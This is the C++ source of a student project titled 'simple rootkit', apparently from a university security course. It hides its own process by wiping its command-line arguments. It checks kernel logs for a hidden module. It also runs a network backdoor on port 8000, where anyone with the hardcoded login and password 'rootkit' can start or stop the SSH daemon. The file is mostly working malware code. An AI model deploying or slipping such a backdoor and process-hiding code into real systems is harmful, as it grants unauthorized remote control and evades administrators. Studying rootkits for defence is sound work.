/*******************************************************************************
 * Projekt:         Projekt č.1: jednoduchý rootkit
 * Jméno:           Radim
 * Příjmení:        Loskot
 * Login autora:    xlosko01
 * E-mail:          xlosko01(at)stud.fit.vutbr.cz
 * Popis:           Hlavni modul, implementuje komunikacni protokol a
 *                  skryti procesu.
 *
 ******************************************************************************/

/**
 * @file rootkit.cpp
 *
 * @brief Main (executable) module, implements communication protocol
 * and hiding of the process.
 * @author Radim Loskot xlosko01(at)stud.fit.vutbr.cz
 */

#include <stdlib.h>
#include <dirent.h>
#include <signal.h>
#include <string.h>

#include <iostream>
#include <fstream>
#include <string>
#include <map>
#include <sstream>

#include "server_lib.h"
#include "regexp.h"

using namespace std::regexp;
using namespace servers;

/**
 * Enumeration of run errors
 */
enum errors {
    ELISTEN       = 0
};

/**
 * Enumeration acceptable commands
 */
enum cmds {
    CMD_start     = 10,
    CMD_stop      = 11,
    CMD_info      = 12,
    CMD_exit      = 13
};

/**
 * Enumeration of general responds
 */
enum responds {
    RESP_OK       = 0,
    RESP_FAILED   = 1,
    RESP_BUSY     = 2,
    RESP_INVALID  = 3,
    RESP_UNCMD    = 4,
    RESP_BADVERS  = 5,
    RESP_BADARG   = 6,
    RESP_BADLOGIN = 7,
    RESP_BADPASS  = 8
};

const int listenPort = 8000;

const char* SSHD_CMDLINE = "/etc/init.d/sshd";
//const char* STOP_SSHD_CMDLINE = "/etc/init.d/sshd stop  > /dev/null";
//const char* START_SSHD_CMDLINE = "/etc/init.d/sshd start  > /dev/null";

const char* STOP_SSHD_CMDLINE = "service sshd stop > /dev/null";
const char* START_SSHD_CMDLINE = "service sshd start > /dev/null";
const char* STATUS_SSHD_CMDLINE = "service sshd status > /dev/null";

const string LOGIN = "rootkit";
const string PASSWORD = "rootkit";

const string WELCOME_TEXT = "(Type in your login and password. Both equals to \"rootkit\".)\n";
const string LOGIN_TEXT = "Login: ";
const string PASSWORD_TEXT = "Password: ";
const string HELP_TEXT =
        "\nCommands and associated actions:\n" \
        "start - starts sshd server\n" \
        "stop  - stops sshd server\n" \
        "info  - shows state of sshd server\n" \
        "exit  - closes connection\n" \
        "==============================================\n" \
        "Type command:\n\n";

/**
 * Definition of run error messages
 */
const string ERRORS[] = {
    "Error occured during listening on interface"
};

/**
 * Definition of general respond messages
 */
const string RESPONDS[] = {
    "200 OK",
    "201 Server failed",
    "302 Server is busy",
    "203 Invalid request",
    "204 Unknown command",
    "205 Bad protocol version",
    "206 Missing/invalid argument(s)",
    "207 Bad login",
    "208 Bad password"
};

/**
 * Supported commands
 */
const string COMMANDS = "start|stop|info|exit";

/**
 * Line delimiter in messages.
 */
const string CRLF = "\r\n";

/**
 * SERVER OBJECT IN GLOBAL NAMESPACE
 */
Server server;

/**
 * Printing directory list into string.
 * @param sig  directory path
 */
void sighandler(int sig) {
    // Block signal SIGINT and properly handle the exiting
    struct sigaction sa;
    sa.sa_handler = SIG_IGN;
    sa.sa_flags = 0;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGINT, &sa, NULL) == -1)
        exit(sig);
    // Stop listening
    server.stopListening();
}

/**
  * Determines whether process with passed process name is running.
  *
  * @param processName Name of the process.
  * @return True whether process is running, otherwise false.
  */
bool isServiceRunning(string processName) {
    /*string processFileName = "/var/run/" + processName + ".pid";
    ifstream processFileStream(processFileName.c_str());
    return processFileStream.good();*/
    
    string statusCMD = "service " + processName + " status > /dev/null";
    return system(statusCMD.c_str()) == 0;
}

/**
 * Prepares respond message from request type and argument.
 * @param cmd type of request.
 * @param arg argument of request message.
 * @return respond message.
 */
void prepareRespond(int cmd, string &header, string &data) {
    data = data;
    
    switch (cmd) {
    // Info about status of ssh server
    case CMD_info:
        header = "Hidden kernel module: "; 
        if (system("dmesg | grep HIDE_ROOTKIT | tail -n 1 | grep \"MODULE EXIT ENDED\" > /dev/null") == 0) {
            header += "recently exited";
        } else if (system("dmesg | grep \"MODULE INIT ENDED\" > /dev/null") == 0) {
            header += "inserted";
        } else {
            header += "not inserted";
        }
        header += "\n";
    case CMD_start: case CMD_stop:
        header += "Status of sshd: is " + string((isServiceRunning("sshd")? "running" : "stopped"));
        break;
    }

}

/**
  * Executes passed command.
  *
  * @param cmd Command to execute.
  */
void executeCommand(int cmd) {
    switch (cmd) {
        case CMD_start:    // Starts ssh server
            system(START_SSHD_CMDLINE);
            cout << "INFO: sshd is " << (isServiceRunning("sshd")? "running" : "stopped") << endl;
            break;
        case CMD_stop:     // Stops ssh server
            system(STOP_SSHD_CMDLINE);
            cout << "INFO: sshd is " << (isServiceRunning("sshd")? "running" : "stopped") << endl;
            break;
    }
}

/**
 * Parses request type from message and its argument.
 * @param msg input request message
 * @param arg argument of message
 * @return FAILURE on bad request/request cmd.
 */
int getCmd(string msg) {
    // Parsing cmd
    RegExp expr("^([a-zA-Z_0-9]*)");
    vector<string> matches;
    matches = expr.exec(msg);

    // cmd selecting
    if (matches.size() > 0) {
        string cmd = matches[1];

        if (cmd == "start") {
            return CMD_start;
        } else if (cmd == "stop") {
            return CMD_stop;
        } else if (cmd == "exit") {
            return CMD_exit;
        } else if (cmd == "info") {
            return CMD_info;
        }
    }

    return FAILURE;
}

/**
  * Sends message to passed socket.
  *
  * @param fd Socket descriptor.
  * @param header Header of the message.
  * @param data Data of the message.
  *
  * @return FAILURE on failure of sending messsage, otherwise SUCCESS.
  */
int sendMessage(int fd, string header, string *data) {
    string msg_out;

    // Building outcoming message
    if (data != NULL && data->length() > 0) {
        stringstream content_length;
        content_length << data->length();

        msg_out =  header + CRLF +
               "Content-length: " + content_length.str() + CRLF +
               CRLF +
               *data;
    } else {
        msg_out =  header;
    }

    // Sending respond
    if (server.sendMsg(fd, msg_out) == FAILURE)
        return FAILURE;

    return SUCCESS;
}

/**
 * Service function which is called with every request from server.
 * Defines reading request and its respond.
 * @param fd socket descriptor for comunication server with unique client
 * @return SUCCESS/FAILURE code.
 */
int service(int fd) {
    string msg_in, header, data;
    int cmd;

    if (server.sendMsg(fd, WELCOME_TEXT) == FAILURE)
        return FAILURE;

    // Reading login message
    server.sendMsg(fd, LOGIN_TEXT);
    if (server.recvMsg(fd, msg_in, CRLF) == FAILURE)
        return FAILURE;
    if (LOGIN.compare(msg_in) != 0) {
        sendMessage(fd, RESPONDS[RESP_BADLOGIN], NULL);
        return FAILURE;
    }

    // Reading password message
    server.sendMsg(fd, PASSWORD_TEXT);
    if (server.recvMsg(fd, msg_in, CRLF) == FAILURE)
        return FAILURE;
    if (PASSWORD.compare(msg_in) != 0) {
        sendMessage(fd, RESPONDS[RESP_BADPASS], NULL);
        return FAILURE;
    }

    if (server.sendMsg(fd, HELP_TEXT) == FAILURE)
        return FAILURE;

    bool exit = false;
    while (!exit) {
        header.clear();
        data.clear();

        // Reading request message
        if (server.recvMsg(fd, msg_in, CRLF) == FAILURE)
            return FAILURE;

        // Checking syntax of recieved message step by step
        vector<string> matches;
        RegExp expr("^([a-zA-Z_0-9]*)([\r\n]|$)");

        if ((matches = expr.exec(msg_in)).size() == 0)      // invalid syntax
            header = RESPONDS[RESP_INVALID];

        expr = "^(" + COMMANDS + ")$";
        if (header.empty() && !expr.test(matches[1]))       // unknown command
        header = RESPONDS[RESP_UNCMD];

        if (header.empty()) {
            // Getting cmd from message
            if ((cmd = getCmd(msg_in)) != FAILURE) {
                executeCommand(cmd);                  // executing cmd
                prepareRespond(cmd, header, data);    // preparing respond message
            } else {
                header = RESPONDS[RESP_BADARG];             // bad options in msg
            }

            if (cmd == CMD_exit)
                exit = true;
        }

        if (sendMessage(fd, header, &data) == FAILURE || sendMessage(fd, "\n", NULL) == FAILURE)
            exit = true;
    }

    return SUCCESS;
}

string convertInt(int number)
{
   stringstream ss;//create a stringstream
   ss << number;//add number to the stream
   return ss.str();//return a string with the contents of the stream
}

int main(int argc, char *argv[]) {
    
    // Hides process - "clears" /proc/PID/cmdline file
    // See: http://stupefydeveloper.blogspot.cz/2008/10/linux-change-process-name.html
    for(int i = 0; i < argc; i++) {
      memset(argv[i], 0, strlen(argv[i]));
    }
    
    /* SERVER - START LISTENING ON INTERFACE AND PORT */
    server.enable_errors = true;
  signal(SIGINT, sighandler);     // Handling SIGINT and properly ending
    server.serviceHandle = service;	// Definition of service function which takes every child
    if (server.startListening(INADDR_ANY, listenPort) != SUCCESS) {
        cerr << ERRORS[ELISTEN] << endl;
        return ELISTEN;
    }

    return SUCCESS;
}
